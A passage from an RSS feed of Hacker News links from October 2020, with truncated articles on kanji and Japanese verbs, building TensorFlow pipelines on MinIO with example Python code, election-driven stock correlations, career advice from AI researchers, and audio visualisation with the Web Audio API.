                  Japan imported symbolic glyphs from mainland Asia and they are referred to as Êº¢Â≠óÔºà„Åã„Çì„ÅòÔºâ kanji ‚Äî letters of the Han Dynasty and there are <a href="https://learnjapanesebest.wordpress.com/2019/12/11/the-four-types-of-kanji/">four types of kanji</a> where only 4% are simple pictographs and over 90% are "meaning-and-sound borrowers."
              </p>
              <p>In acquiring Japanese, modern learners often rely on methods inspired by <a href="https://smile.amazon.com/Remembering-Kanji-Complete-Japanese-Characters/dp/0824835921?pldnSite=1">Heisig's Remembering the Kanji,</a> a book written by James Heisig after he had arrived in Japan too late to take the introductory course; upon asking his friends what the hardest part of the language was, he was quickly informed that the Kanji are a most formidable adversary.  He took the spare time before the next semester started to try his best to conquer this formidable opponent, and in the process discovered that he could break the kanji down section-by-section, part-by-part, and develop clever mnemonic devices and imaginary scenes to remember their <strong>general meanings</strong> for the long-term.
              </p>
                <p>
                  Heisig only provides clear and concise mnemonics for the first hundred-or-so kanji in his series, which is quite deflating to the beginner, leaving much of the creative and mental work to the learner when they could be absorbing, rather than generating, content.  This is the reason that we have taken it upon ourselves at Japanese Complete to provide detailed mnemonic lessons for the kanji we teach.  You can see the most frequent 777 kanji on our <a href="https://japanesecomplete.com/777">777 kanji list.</a></p>
                
            </div>
          </div>
          <p><img src="https://japanesecomplete.com/img/shrine-green.jpg" alt="Image">
          </p>
        </div>
    </div></section> <!--end part 4-->

  <section id="part5">
      <div>
        <div>
          <p><img src="https://japanesecomplete.com/img/himeji-sky.jpg" alt="Image">
          </p>
          <div>
            <div>
                <h2>Verbs: Meanings, Connotations</h2>
                <p>
                  Every Japanese sentence ends with a verb.  Our classification scheme in Japanese Complete comes from conversations with expert language teachers from University College London and Middlebury College, schools renowned for their East Asian studies and language departments.  While normal textbooks try to wedge Japanese grammar as a round peg into the square-hole shape of English, Japanese Complete strives to simplify the equation as much as possible while retaining all the fidelity and integrity of real Japanese.  Our <a href="https://japanesecomplete.com/reverse-engineer/">Reverse Engineering a Japanese Sentence</a> page details how our classification of verbs and nouns differs from common textbooks, and illustrates how they are more coherent with actual Japanese.
              </p>
              <p>In general, verbs are the missing piece of every Japanese sentence and we must wait until the end of the sentence or phrase to hear or read them.  This is what makes translation and interpretation notoriously difficult, for a translator needing a verb to connect two thoughts, nouns, or ideas, must allow the Japanese speaker to complete the phrase, adding a significant delay to the process, all-the-while needing to be able to perceive the beginning of the next phrase.  The latency effect in translating and interpreting Japanese makes this skill quite coveted in tourism, national and international diplomacy, and any role where interpretation in real-time is a must.
              </p>
                <p>
                By learning a large subset of verbs in their "plain-form" first, and then learning how to transform verbs into their variety of tenses and aspects, one builds a solid foundation for understanding written and oral Japanese.  <strong>It is wise to familiarize oneself with the great variety of tenses, active and passive constructions, and formality levels early on, so that they are not completely foreign when encountered later on in advanced studies.</strong>  In Japanese Complete, we teach politeness levels, active and passive tenses, and the variety of verbs early on so that learners have a solid foundation and are not surprised to find whole new constructions in years 3 or 4, but instead are immediately confronted with the variegated tones of the language and its inflexions.
                </p>
                
            </div>
          </div>
        </div>
    </div></section> <!--end part 5-->

      <section id="part6">
      <div>
        <div>
          <div>
            <div>
                <h2>Kanji: Masking</h2>
                <p>
                  Have you ever written a message using emoji only?  Did you know that emoji is a word imported from Japanese?  
              </p>
              <p>
                Just as there are ways to communicate entirely using emoji, Japanese adopted a way early on of using ‚Ä¶</p></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://japanesecomplete.com/path/">https://japanesecomplete.com/path/</a></em></p>]]>
            </description>
            <link>https://japanesecomplete.com/path/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938456</guid>
            <pubDate>Fri, 30 Oct 2020 02:19:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating large scale machine learning pipelines with MinIO and TensorFlow]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24938451">thread link</a>) | @jtsymonds
<br/>
October 29, 2020 | https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/ | <a href="https://web.archive.org/web/*/https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <div><p>We are living in a transformative era defined by information and AI. Massive amounts of data are generated and collected every day to feed these voracious, state-of-the-art, AI/ML algorithms. The more data, the better the outcomes. </p><p>One of the frameworks that has emerged as the lead industry standards is <a href="https://www.tensorflow.org/">Google's TensorFlow</a>. &nbsp;Highly versatile, one can get started quickly and write simple models with their <a href="https://www.tensorflow.org/guide/keras?hl=en">Keras</a> framework. If you seek a more advanced approach TensorFlow also allows you to construct your own machine learning models using low level APIs. No matter what strategy you choose, TensorFlow will make sure that your algorithm gets optimized for whatever infrastructure you select for your algorithms - whether it's <a href="https://en.wikipedia.org/wiki/Central_processing_unit">CPU's</a>, <a href="https://en.wikipedia.org/wiki/Graphics_processing_unit">GPU's</a> or <a href="https://en.wikipedia.org/wiki/Tensor_processing_unit">TPU's</a>.</p></div><p>As datasets become too large to fit into memory or local disk, AI/ML pipelines now have the requirement to load data from an external data source. Take for example the <a href="https://en.wikipedia.org/wiki/ImageNet">ImageNet</a> dataset with its <code>14 Million Images</code> with an estimated storage size of <code>1.31TB</code>. This dataset cannot be fit into memory nor on any machine local storage drive. These challenges are further complicated if your pipelines are running inside a stateless environment such a Kubernetes (which is increasingly the norm). </p><p>The emerging standard for this problem is to employ high performance object storage in the design of your AI/ML pipelines. MinIO is the leader in this space and has published a number of benchmarks that speak to its throughput capabilities. In this post, we will cover how to leverage MinIO for your TensorFlow projects. </p><p><strong>A Four Stage Hyper-Scale Data Pipeline</strong></p><p>To build a hyper-scale pipeline we will have each stage of the pipeline read from MinIO. In this example we are going to build four stages of a machine learning pipeline. This architecture will load the desired data on-demand from MinIO. </p><p>First, we are going to preprocess our dataset and encode it in a format that TensorFlow can quickly digest. This format is the <a href="https://www.tensorflow.org/tutorials/load_data/tfrecord">tf.TFRecord</a>, which is a type of binary encoding for our data. We are taking this step because we do not want to waste time processing the data during the training as we are planning on loading each batch of training directly from MinIO as it's needed. If the data is pre-processed before we feed it into the model training we save a significant amount of time. Ideally, we create pre-processed chunks of data that group a good chunk of records - at least <code>100-200MB</code> in size.</p><p>To speed up the data-loading and training stages we are going to leverage the excellent <a href="https://www.tensorflow.org/api_docs/python/tf/data">tf.data</a> api. This API is designed to efficiently load data during the training/validation of our model. It prepares the next batch of data as the current one is being processed by the model. The advantage of this approach is that it ensures efficient utilization of expensive GPUs or TPUs which cannot sit idle due to slow loading data. MinIO does not encounter this problem - <a href="https://min.io/resources/docs/MinIO-Throughput-Benchmarks-on-NVMe-SSD-32-Node.pdf">it can saturate 100Gbps network with a few NVMe drives</a> or also <a href="https://min.io/resources/docs/MinIO-Throughput-Benchmarks-on-HDD-24-Node.pdf">with Hard Disk Drives</a> ensuring the pipeline is crunching data as fast as the hardware allows.</p><p>During training we want to make sure we store the training checkpoints of our model as well as TensorBoard histograms. The checkpoints are useful in case the training gets interrupted and we want to resume the training or if we get more data and want to keep training our model with the new data and the TensorBoard histograms let us see how the training is going as it happens. TensorFlow supports writing both of these directly to MinIO.</p><p>A quick side note. When the model is complete we will save it to MinIO as well - allowing us to serve it using <a href="https://www.tensorflow.org/tfx/guide/serving">TensorFlow Serving</a> &nbsp;- but that's a post for some other time.</p><figure><img src="https://blog.min.io/content/images/2020/05/Screen-Shot-2020-05-11-at-5.36.46-PM.png"><figcaption>End-to-End Pipeline using MinIO</figcaption></figure><h2 id="building-the-pipeline">Building the Pipeline</h2><p>For our hyper-scale pipeline we are going to use a dataset that can easily fit into your local computer so you can follow along. The <a href="https://ai.stanford.edu/~amaas/data/sentiment/">Large Movie Review Dataset </a>from Stanford is great since it has a large number of samples (25,000 for training and 25,000 for testing) so we are going to build a <a href="https://en.wikipedia.org/wiki/Sentiment_analysis">sentiment analysis model</a> that will tell us whether a movie review is <code>positive</code> or <code>negative</code>. Keep in mind that each step can be applied to any larger dataset. The advantage of this dataset is that you can try on your own computer. Let's get started!</p><p>Download the dataset and upload it to MinIO using <a href="https://docs.min.io/docs/minio-client-quickstart-guide.html">MinIO Client</a></p><pre><code>curl -O http://ai.stanford.edu/~amaas/data/sentiment/aclImdb_v1.tar.gz
mc mb myminio/datasets
mc cp aclImdb_v1.tar.gz myminio/datasets/</code></pre><p>Let's start by declaring some configurations for our pipeline, &nbsp;such as <code>batch size</code>, location of our dataset and a fixed <code>random seed</code> so we can run this pipeline again and again and get the same results.</p><pre><code>random_seed = 44
batch_size = 128
datasets_bucket = 'datasets'
preprocessed_data_folder = 'preprocessed-data'
tf_record_file_size = 500
# Set the random seed
tf.random.set_seed(random_seed)

# How to access MinIO
minio_address = 'localhost:9000'
minio_access_key = 'minioadmin'
minio_secret_key = 'minioadmin'</code></pre><p>We are going to download our dataset from MinIO using <code><a href="https://github.com/minio/minio-py">minio-py</a></code></p><pre><code>minioClient = Minio(minio_address,
                  access_key=minio_access_key,
                  secret_key=minio_secret_key,
                  secure=False)
try:
       minioClient.fget_object(
           datasets_bucket,
           'aclImdb_v1.tar.gz',
           '/tmp/dataset.tar.gz')
except ResponseError as err:
       print(err)</code></pre><p>Now let's uncompress the dataset to a temporary folder (<code>/tmp/dataset</code>) to preprocess our data</p><pre><code>extract_folder = f'/tmp/{datasets_bucket}/'

with tarfile.open("/tmp/dataset.tar.gz", "r:gz") as tar:
    tar.extractall(path=extract_folder)</code></pre><h3 id="pre-processing">Pre-Processing</h3><p>Due to the structure of the dataset we are going to read from four folders, initially <code>test</code> and <code>train</code> which hold <code>25,000</code> examples each, then, in each of those folders we have <code>12,500</code> of each label <code>pos</code> for positive comments and <code>neg</code> for negative comments. From these four folders, we are going to store all samples into two variables, <code>train</code> and <code>test</code>. If we were preprocessing a dataset that couldn't fit in the local machine we could simply load segments of the object, one at a time and process them as well.</p><pre><code>train = []
test = []

dirs_to_read = [
    'aclImdb/train/pos',
    'aclImdb/train/neg',
    'aclImdb/test/pos',
    'aclImdb/test/neg',
]

for dir_name in dirs_to_read:
    parts = dir_name.split("/")
    dataset = parts[1]
    label = parts[2]
    for filename in os.listdir(os.path.join(extract_folder,dir_name)):
        with open(os.path.join(extract_folder,dir_name,filename),'r') as f:
            content = f.read()
            if dataset == "train":
                train.append({
                    "text":content,
                    "label":label
                })
            elif dataset == "test":
                test.append({
                    "text":content,
                    "label":label
                })</code></pre><p>We will then shuffle the dataset so we don't introduce bias into the training by providing 12,500 consecutive positive examples followed by 12,500 consecutive negative examples. Our model would have a hard time generalizing that. By shuffling the data the model will get to see and learn from both positive and negative examples at the same time.</p><pre><code>random.Random(random_seed).shuffle(train)
random.Random(random_seed).shuffle(test)</code></pre><p>Since we are dealing with text we need to turn the text to a vector representation that accurately depicts the meanings of the sentence. If we were dealing with images we would resize the images and turn them into vector representations having each pixel be a value of the resized image. </p><p>For text, however, we have a bigger challenge since a word doesn't really have a numerical representation. This is where <a href="https://en.wikipedia.org/wiki/Embedding">embeddings</a> are useful. An embedding is a vector representation of some text, in this case we are going to represent the whole review as a single vector of 512 dimensions. Instead of doing the pre-processing of text manually (tokenizing, building vocabulary and training an embeddings layer) we are going to leverage an existing model called <a href="https://arxiv.org/abs/1803.11175">USE (Universal Sentence Encoder)</a> to encode sentences into vectors so we can continue with our example. This is one of the wonders of deep learning, the ability to re-use different models alongside yours. Here we use TensorFlow Hub and we are going to load the latest <code>USE</code> model.</p><pre><code>import tensorflow_hub as hub
embed = hub.load("https://tfhub.dev/google/universal-sentence-encoder-large/5")</code></pre><p>Since it would be too much to create the embeddings of <code>25,000</code> sentences and keep that in memory, we are going to slice our datasets into chunks of <code>500</code>.</p><p>To store our data into a <code>TFRecord</code> we need to encode the features as <code>tf.train.Feature</code>. &nbsp;We are going to store the label of our data as list of <code>tf.int64</code> and our Movie Review as a list of floats since after we encode the sentence using <code>USE</code> we will end-up with a embedding of <code>512</code> dimensions</p><pre><code>def _embedded_sentence_feature(value):
    return tf.train.Feature(float_list=tf.train.FloatList(value=value))
def _label_feature(value):
    return tf.train.Feature(int64_list=tf.train.Int64List(value=value))
def encode_label(label):
    if label == "pos":
        return tf.constant([1,0])
    elif label == "neg":
        return tf.constant([0,1])

# This will take the label and the embedded sentence and encode it as a tf.TFRecord
def serialize_example(label, sentence_tensor):
    feature = {
      'sentence': _embedded_sentence_feature(sentence_tensor[0]),
      'label': _label_feature(label),
    }
    example_proto = tf.train.Example(features=tf.train.Features(feature=feature))
    return example_proto
    
def process_examples(records,prefix=""):
    starttime = timeit.default_timer()
    total_training = len(records)
    print(f"Total of {total_training} elements")
    total_batches = math.floor(total_training / tf_record_file_size)
    if total_training % tf_record_file_size != 0:
        total_batches += 1 
    print(f"Total of {total_batches} files of {tf_record_file_size} records")

    counter = 0
 ‚Ä¶</code></pre></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/">https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/</a></em></p>]]>
            </description>
            <link>https://blog.min.io/hyper-scale-machine-learning-with-minio-and-tensorflow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938451</guid>
            <pubDate>Fri, 30 Oct 2020 02:18:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Predicting the stock market impact of the Presidential election outcome]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938426">thread link</a>) | @greatwave1
<br/>
October 29, 2020 | https://www.quiverquant.com/blog/092420 | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/blog/092420">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="presentation" width="100%"><tbody><tr><td><div id="hs_cos_wrapper_module_16009687456759" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div id="hs_cos_wrapper_module_16009687456759_" data-hs-cos-general-type="widget" data-hs-cos-type="rich_text"><p>The effect of the election on health technology and health services stocks will likely depend not only on who wins the Presidency but also on whether or not Republicans maintain control of the Senate.</p>

<p>If Democrats win both the White House and the Senate (and maintain control of the House) you‚Äôll see revived efforts to pick up the pieces of the Affordable Care Act and continue to transform the U.S. healthcare system. This transformation is likely to come at the expense of private healthcare companies' bottom lines.</p>

<p>On the other hand, Republicans maintaining control of the White House and/or Senate would likely result in a divided government, with no significant legislation on healthcare being passed.</p>

<p><span><strong>Cannabis</strong></span></p>
<p>Not surprisingly, most major cannabis stocks have a very low Trump Beta, meaning they are likely to perform well if Biden is elected.</p>

<p><a href="https://www.quiverquant.com/dashboard/cgc?utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz--aeAl_3OrGl0eIcgqVx9ZyT6fLkP5VebAkQXLL8vu_yMXHRAtBKo4rmmQtRkFWTuB6kHhk" rel="noopener" data-hs-link-id="0" target="_blank">Canopy Growth Corp ($CGC)</a> has a Trump Beta of -0.20, <a href="https://www.quiverquant.com/dashboard/gwph?utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz--aeAl_3OrGl0eIcgqVx9ZyT6fLkP5VebAkQXLL8vu_yMXHRAtBKo4rmmQtRkFWTuB6kHhk" rel="noopener" data-hs-link-id="0" target="_blank">GW Pharmaceuticals ($GWPH)</a> comes in at -0.29, and <a href="https://www.quiverquant.com/dashboard/cron?utm_source=hs_email&amp;utm_medium=email&amp;_hsenc=p2ANqtz--aeAl_3OrGl0eIcgqVx9ZyT6fLkP5VebAkQXLL8vu_yMXHRAtBKo4rmmQtRkFWTuB6kHhk" rel="noopener" data-hs-link-id="0" target="_blank">Cronos Group ($CRON)</a> has a Trump Beta of -0.31.</p>

<p>Though Biden took a tough stance on federally controlled substances back in the 1980s and 1990s, he has recently embraced a platform of decriminalizing marijuana. Additionally, running mate Kamala Harris is known as an advocate for legalization. As a junior senator in California, she sponsored the Marijuana Opportunity Reinvestment and Expungement (MORE) Act, which the Democrat-controlled House Judiciary Committee passed last November. The bill hasn‚Äôt gotten anywhere yet, but many suppose that a democratic sweep this November could lead to marijuana legalization.</p>

<p>On the other hand, cannabis legislation has not been a priority under Trump, and there is no reason right now to believe that this will change during a second term.</p>

<p><span><strong>Large-cap Tech Companies</strong></span></p>
<p>Companies in the technology services and electronic technology sectors have an average Trump Beta of 0.12 and 0.15, respectively. This is primarily driven by the large-cap tech companies that dominate their industries, with Microsoft, Google, Apple, and Adobe all showing strong positive correlations with a Trump re-election.</p></div></div></td></tr></tbody></div></div>]]>
            </description>
            <link>https://www.quiverquant.com/blog/092420</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938426</guid>
            <pubDate>Fri, 30 Oct 2020 02:14:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advice from AI Experts to Those Starting Out in the Field]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938401">thread link</a>) | @navanchauhan
<br/>
October 29, 2020 | https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/ | <a href="https://web.archive.org/web/*/https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.re-work.co/content/images/size/w300/2020/10/antenna-cw-cj_nFa14-unsplash.jpg 300w,
                            https://blog.re-work.co/content/images/size/w600/2020/10/antenna-cw-cj_nFa14-unsplash.jpg 600w,
                            https://blog.re-work.co/content/images/size/w1000/2020/10/antenna-cw-cj_nFa14-unsplash.jpg 1000w,
                            https://blog.re-work.co/content/images/size/w2000/2020/10/antenna-cw-cj_nFa14-unsplash.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://blog.re-work.co/content/images/size/w2000/2020/10/antenna-cw-cj_nFa14-unsplash.jpg" alt="20+ Pieces Of Advice From AI Experts To Those Starting Out In The Field">
</figure>
<section>
<div>
<p>Following on from our previous <a href="https://blog.re-work.co/tag/expert-blogs/">expert-led series</a>, we asked our community of AI experts what advice they would give to both those starting out their careers and those that have a desire to potentially join the field. </p><p>Below we have contributions from those working in both academia and industry settings, all at the forefront of AI development. What pieces of advice would you add?</p><p>TL;DR available in the footer. </p><h3 id="alexia-jolicoeur-martineau-phd-researcher-mila"><a href="https://www.linkedin.com/in/alexiajm/">Alexia Jolicoeur-Martineau</a>, PhD Researcher, MILA</h3><p>Here are some general advices, they are a bit more research oriented, but the perfectionism one applies even to applied positions..</p><ul><li>Don't over <strong>obsess on having everything 100% perfect</strong>. Develop a getting things done attitude. Academic perfectionism is the biggest plague in academia</li><li>Don't expect your research to speak for itself. Promotion (on social media) and dissemination (with blog posts) is important</li></ul><hr><h3 id="jane-wang-senior-research-scientist-deepmind"><a href="https://www.linkedin.com/in/jane-wang-63167017/">Jane Wang</a>, Senior Research Scientist, DeepMind</h3><p><strong>Don't chase after the hottest trends or the biggest splashes</strong>, as these areas will have the most competition and also will likely be superseded quickly anyway. Think about what kinds of problems you're most interested in solving, and what problems are likely to make the most impact if solved. The first involves being aware of what kinds of work you like doing (programming, theorizing, playing with real-world data, etc), and the second involves looking around and being informed about how the rest of the world lives. <strong>It's important we don't silo ourselves off in a bubble in this field</strong>, because this technology is making and will continue to make a huge impact on everyone in the world. Try to figure out what kind of role you want to have in that impact, and how to actively shape that impact to be beneficial for everyone.</p><hr><h3 id="abhishek-gupta-founder-montreal-ai-ethics-institute"><a href="https://www.linkedin.com/in/abhishekguptamcgill/">Abhishek Gupta</a>, Founder, Montreal AI Ethics Institute</h3><p>For those who are just getting started in an AI role, my primary advice would be to take a measured approach in believing AI to be a magic bullet that solves everything. As reality and business constraints emerge, an emerging practitioner will realize the role that simplicity plays in achieving real-world deployments and how taking an engineering and scientific approach to the deployment of the systems is more important than chasing every shiny new technique that they see on the internet. A deep understanding of the societal impacts of their work is also something that they should consider as a part of their work. And finally, thinking about the value of collaborating with domain experts should be something that is front and center for an emerging practitioner. <strong>I have seen far too many new practitioners apply AI skills to projects where there is no domain expertise involved and it inevitably leads to non-meaningful outcomes</strong> that diminish the value of the time and effort that goes into creating a project and can also result in harm for the people who are the subjects of that system.</p><hr><h3 id="andriy-burkov-director-of-data-science-gartner"><a href="https://www.linkedin.com/in/andriyburkov/">Andriy Burkov</a>, Director of Data Science, Gartner</h3><p>1. Learn the foundations. <strong>"Hands-on" alone, without an understanding of the underlying math, will not let you become the best in this profession</strong>. Today, and especially in the next 5-7 years, the tools will become so mature, that only your imagination will count. <strong>In AI, you cannot imagine anything meaningful if you don't know how the machine "thinks."</strong> Take a sculptor, an architect, or a painter. The best of them know everything about the tools and materials they work with. The same is true for AI.2.<strong> Go where the data is</strong>. AI is nothing without data, just as your talents.</p><hr><h3 id="alireza-fathi-senior-research-scientist-google"><a href="https://www.linkedin.com/in/alireza-fathi-04338411/">Alireza Fathi</a>, Senior Research Scientist, Google</h3><p>The two main pieces that I can think of that can result in a successful career in AI are the following: (a) <strong>strong math and coding fundamentals</strong> and (b) being on top of the most recently published papers in the field. I think a strong background in Algebra, probability and statistics, machine learning and at the same time powerful coding skills are critical to the success of an AI scientist in the long term. Sometimes (like now) the field becomes more practical and result oriented where coding is a very necessary skill to be able to implement ideas and run experiments quickly and efficiently.</p><p>But there will always be times when things become more theoretical and fundamental where having a strong math background can make a big difference. <strong>Being on top of AI literature is another very important skill. Unlike most other established fields where one can learn a lot from books, AI is a very new field that is evolving day to day</strong>. Methods that were achieving state of the art performance six months ago will be obsolete now. Thus, being able to quickly read papers, understand them and position them in the large body of previous work is a necessary skill for a successful AI scientist.</p><hr><h3 id="sarah-laszlo-phd-senior-neuroscientist-x-the-moonshot-factory"><a href="https://www.linkedin.com/in/sarah-laszlo-284886114/">Sarah Laszlo</a>, PhD, Senior Neuroscientist, X, The Moonshot Factory</h3><p>1) &nbsp;Don't judge yourself for not knowing something.</p><p><strong>One of my team's principles for working together is that we all agree that "Not knowing something only means not knowing something.</strong>" &nbsp;It doesn't have any other meaning: it doesn't mean you are stupid; it doesn't mean you are not trying hard enough; it doesn't mean you aren't good at your job. &nbsp;It only means that you don't know that particular thing. &nbsp;No one can know everything, and you shouldn't judge yourself because you don't.</p><p>Which brings us to #2:</p><p>2) Don't work with people who judge you for not knowing everything.</p><p>Don't work with people that make you feel like you don't belong, aren't smart enough, can't do this job. To the extent that you get to choose what teams you work on, gravitate to teams where not knowing something is seen as an opportunity to learn something new, rather than a strike against you.</p><p><strong>In my experience, a good sign of a good team is an environment where questions are not only welcome, but encouraged</strong>. When a complicated topic is raised, do people ask questions, or sit silently with a grim look of determined understanding on their face? Is the environment welcoming for questions and curiosity, or do team members seem embarrassed to ask questions? Do team members make an effort to explain complicated topics? &nbsp;Does the team value presentations that everyone in the audience understands? Wherever you can, you should require the teams that you work on to create an inclusive environment where everyone‚Äôs curiosity is respected and valued. It is possible to work in the AI field without constantly feeling impostor-syndrome dread; don't accept it as the norm.</p><hr><h3 id="frankie-cancino-senior-ai-scientist-target"><a href="https://www.linkedin.com/in/frankie-cancino/">Frankie Cancino</a>, Senior AI Scientist, Target </h3><p>Landing your first AI role is electrifying. A career in AI comes with many challenges, but it allows for innovation and exciting possibilities. My first piece of advice ‚Äì <strong>don‚Äôt forget the basics and what got you there</strong>. It is easy to jump at the newest tech and methodologies. However, building a solid foundation with skills that can be applied across many domains will help with the additional building blocks. These skills will include writing code, statistics, probability theory, and linear algebra. Which leads into my second bit of advice ‚Äì <strong>never stop learning</strong>. Continue to put yourself in situations that will require you to learn. </p><p>If you follow the first bit of advice, you will set yourself up for success and give yourself flexibility in implementing solutions. Keep in mind, the mathematical knowledge alone may not be enough. You will likely need to develop some domain expertise in the area you decide to pursue. Other skills such as writing (good) code, scalability, excellent user experience, and learning from past mistakes are important to develop. Since technology continuously evolves, you will have to continuously apply this learning mindset to keep up. Something extra I will leave with ‚Äì remember your why. As with any job or career, it rarely goes as smooth as you would hope. Personally, I find work in AI fascinating, interesting, and fun. <strong>You may have a different reason for entering the field of AI. Whatever your reason may be, it‚Äôs good to remind yourself on occasion</strong>.</p><hr><h3 id="jeff-clune-research-team-leader-openai"><a href="https://www.linkedin.com/in/jeff-clune-56403a26/">Jeff Clune</a>, Research Team Leader, OpenAI</h3><p>When speaking to Jeff earlier this year, I asked him what advice he would give to someone starting a career in AI or Data Science. It was simple (mainly due to the quick-fire question format of our interview), but one that leaves you pondering. "To quote the words of Wayne Gretzky, the greatest of all time, <strong>skate to where the puck is going not where it is now.</strong>" &nbsp;</p><hr><h3 id="anirudh-koul-machine-learning-lead-nasa"><a href="https://www.linkedin.com/in/anirudhkoul/">Anirudh Koul</a>, Machine Learning Lead, NASA &nbsp;</h3><p><strong>Learn by building projects</strong>: Everybody learns differently, but you need excitement, you need the motivation to keep learning day after day - after the glamour of AI buzz words dies out. So what better way to learn than to take something relatable, build it in a few lines of code using high-level APIs. And as you start getting comfortable, then start to look at the inner theory and improve your breadth and depth in knowledge step by step.</p><p><strong>Training is just half the battle: </strong>Questions to ponder over when you build any project:</p><ul><li>What would your complete end to end pipeline look like?</li><li>How would you build a cloud API to serve the web frontend?</li><li>How do you scale from hundreds of images vs millions to billions?</li><li>What would be the cost involved in scaling this up?</li><li>How would you evaluate performance metrics, eg latency, and accuracy for model drift?</li><li>How would you process the new incoming data? When would you retrain the model?</li><li>While scaling up how do you make your network and pipeline efficient? How do you reduce the floating-point computations in your network? How would you reduce the size of the embeddings while still having the same representative power?</li><li>What could be potential sources of bias?</li></ul><p><strong>An experienced AI practitioner asks these questions from the get-go. So building experience in end to end projects teaches you industry-relevant skills early on.</strong></p><hr><h3 id="lofred-madzou-ai-project-lead-world-economic-forum"><a href="https://www.linkedin.com/in/lofred-madzou-5878a875/">Lofred Madzou</a>, AI Project Lead, World Economic Forum </h3><p>Over the past decade, artificial intelligence (AI) has emerged as the software engine that drives the Fourth Industrial Revolution, a ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/">https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/</a></em></p>]]>
            </description>
            <link>https://blog.re-work.co/ai-experts-advice-for-those-entering-the-field/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938401</guid>
            <pubDate>Fri, 30 Oct 2020 02:10:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Complexity of Songs (1984) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938398">thread link</a>) | @vagab0nd
<br/>
October 29, 2020 | http://www.cs.bme.hu/~friedl/alg/knuth_song_complexity.pdf | <a href="https://web.archive.org/web/*/http://www.cs.bme.hu/~friedl/alg/knuth_song_complexity.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.cs.bme.hu/~friedl/alg/knuth_song_complexity.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938398</guid>
            <pubDate>Fri, 30 Oct 2020 02:09:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Audio Visualizations Working with Web Audio API]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24938292">thread link</a>) | @arcatech
<br/>
October 29, 2020 | https://dwayne.xyz/post/audio-visualizations-web-audio-api | <a href="https://web.archive.org/web/*/https://dwayne.xyz/post/audio-visualizations-web-audio-api">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <h2>Web Audio API</h2>
<p>I‚Äôve been working on getting WebRTC video chat working here on the website for a few weeks now. I finally got to the point where both text, video chat, and screen sharing all work really well, but somewhere in the back of my mind I kept thinking about complaints about ‚Äú<a href="https://www.psychologytoday.com/us/blog/brain-waves/202007/why-zoom-fatigue-is-real-and-what-you-can-do-about-it">Zoom fatigue</a>‚Äù during the pandemic:</p>
<blockquote>
<p>Zoom fatigue, Hall argues now, is real. ‚ÄúZoom is exhausting and lonely because you have to be so much more attentive and so much more aware of what‚Äôs going on than you do on phone calls.‚Äù If you haven‚Äôt turned off your own camera, you are also watching yourself speak, which can be arousing and disconcerting. The blips, delays and cut off sentences also create confusion. Much more exploration needs to be done, but he says, ‚Äúmaybe this isn‚Äôt the solution to our problems that we thought it might have been.‚Äù Phone calls, by comparison, are less demanding. ‚ÄúYou can be in your own space. You can take a walk, make dinner,‚Äù Hall says.</p>
</blockquote>

<p>It‚Äôs kind of an interesting thing to have on your mind while spending weeks writing/debugging/testing video chat code.</p>
<p>So I decided to add an audio-only mode. And if I was gonna do that, I had to show something cool in place of the video. So I figured I would try to add audio visualizations when one or both of the users didn‚Äôt have video on. Using the relatively recent<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API">Web Audio API</a> seemed like the right way to go.</p>
<p>Here‚Äôs what I came up with:</p>
<div><video controls="" muted="" autoplay="" playsinline="" loop=""><source src="https://media.dwayne.xyz/blog/audio-visualization.mp4" type="video/mp4"></video><p>Screen recording of the local audio visualization. I cycle through bar graph in light mode, bar graph in dark mode, sine wave in dark mode, then sine wave in light mode.</p></div>
<h2>Creating and hooking up an AnalyserNode</h2>
